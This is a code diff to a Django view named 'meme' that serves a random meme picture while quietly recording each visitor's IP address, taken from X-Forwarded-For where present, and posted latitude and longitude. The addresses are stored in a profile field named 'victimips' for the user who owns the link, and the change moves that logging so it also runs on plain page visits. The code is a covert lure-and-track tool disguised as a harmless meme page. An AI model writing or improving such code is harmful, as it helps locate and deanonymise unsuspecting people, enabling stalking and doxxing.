@@ -313,10 +313,10 @@ def settings(request):
 
 @csrf_exempt
 def meme(request, username):
+  imgurl=None
+  ip=None
   if request.method == 'GET':
     ip = request.META.get('REMOTE_ADDR')
-    return render(request, 'meme.html')
-  
   elif request.method == 'POST':
     username = username
     x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
@@ -327,19 +327,19 @@ def meme(request, username):
     print(ip)
     print(request.POST.get('latitude'))
     print(request.POST.get('longitude'))
-    user = User.objects.filter(username=username).first()
-
-    if user.profile.victimips == '':
-      user.profile.victimips = ip
-    elif ip in user.profile.victimips:
-      pass
-    else:
-      user.profile.victimips += ','+ip
-    user.profile.save()
     img = (requests.get("https://meme-api.herokuapp.com/gimme"))
     imgurl = img.json()
     imgurl = imgurl['url']
-    return render(request, 'meme.html', {'img':imgurl})
+  user = User.objects.filter(username=username).first()
+
+  if user.profile.victimips == '':
+    user.profile.victimips = ip
+  elif ip in user.profile.victimips:
+    pass
+  else:
+    user.profile.victimips += ','+ip
+  user.profile.save()
+  return render(request, 'meme.html', {'img':imgurl})
 
   
 @csrf_exempt
